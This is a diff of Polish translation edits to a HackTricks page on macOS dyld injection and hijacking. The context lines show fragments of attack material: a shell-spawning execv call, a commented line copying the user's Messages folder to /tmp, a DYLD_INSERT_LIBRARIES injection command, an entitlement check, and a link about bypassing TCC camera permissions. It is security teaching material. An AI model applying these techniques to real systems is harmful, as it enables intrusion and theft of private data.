@@ -35,7 +35,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binary do zaatakowania:
+Plik binarny do zaatakowania:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -50,12 +50,12 @@ Wstrzyknięcie:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking Example
+## Przykład Dyld Hijacking
 
-Docelowy podatny plik binarny to `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Celem jest podatny binarny plik `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
-{% tab title="entitlements" %}
+{% tab title="uprawnienia" %}
 <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>[...]com.apple.security.cs.disable-library-validation[...]
 </strong></code></pre>
@@ -164,7 +164,7 @@ I **wykonaj** binarny i sprawdź, czy **biblioteka została załadowana**:
 </code></pre>
 
 {% hint style="info" %}
-Fajny artykuł na temat tego, jak wykorzystać tę lukę do nadużycia uprawnień kamery w telegramie, można znaleźć pod adresem [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Fajny artykuł na temat tego, jak wykorzystać tę lukę do nadużycia uprawnień kamery w telegramie można znaleźć pod adresem [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
 ## Większa skala
@@ -183,7 +183,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
 {% endhint %}
